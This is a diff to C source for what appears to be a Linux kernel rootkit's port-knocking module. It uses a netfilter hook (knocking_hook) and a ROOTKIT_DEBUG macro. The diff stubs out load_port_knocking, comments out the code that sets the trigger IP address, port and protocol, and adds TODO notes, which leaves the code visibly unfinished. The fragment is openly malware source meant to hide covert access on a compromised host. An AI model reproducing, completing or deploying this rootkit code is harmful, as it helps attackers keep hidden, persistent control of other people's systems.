@@ -34,6 +34,10 @@ static __u32 ip;
 static int
 is_port_blocked (struct sk_buff *skb) {
 
+
+// TODO FIX THIS FUNCTION
+
+
 	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
@@ -137,7 +141,8 @@ knocking_hook (const struct nf_hook_ops *ops,
 
 /* enable port knocking */
 int
-load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
+// TODO: remove this: load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
+load_port_knocking (void)
 {
 	int ret;
 	u8 tmp[4];
@@ -145,23 +150,23 @@ load_port_knocking (char *ipv4_addr, unsigned int port_number, int proto)
 	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
 	
 	/* convert ip string to an int array */
-	in4_pton(ipv4_addr, -1, tmp, -1, NULL);
-	ip = 0;
+	//in4_pton(ipv4_addr, -1, tmp, -1, NULL);
+	//ip = 0;
 
 	/* hack to convert byte array to __u32 */
-	ip |= tmp[0] & 0xFF;
-	ip <<= 8;
-	ip |= tmp[1] & 0xFF;
-	ip <<= 8;
-	ip |= tmp[2] & 0xFF;
-	ip <<= 8;
-	ip |= tmp[3] & 0xFF;
+	//ip |= tmp[0] & 0xFF;
+	//ip <<= 8;
+	//ip |= tmp[1] & 0xFF;
+	//ip <<= 8;
+	//ip |= tmp[2] & 0xFF;
+	//ip <<= 8;
+	//ip |= tmp[3] & 0xFF;
 
 	/* copy the port number */
-	port = port_number;
+	//port = port_number;
 
 	/* copy the protocol */
-	protocol = proto;
+	//protocol = proto;
 
 	/* setup everything for the netfilter hook */
 	hook.hook = knocking_hook;		/* our function */
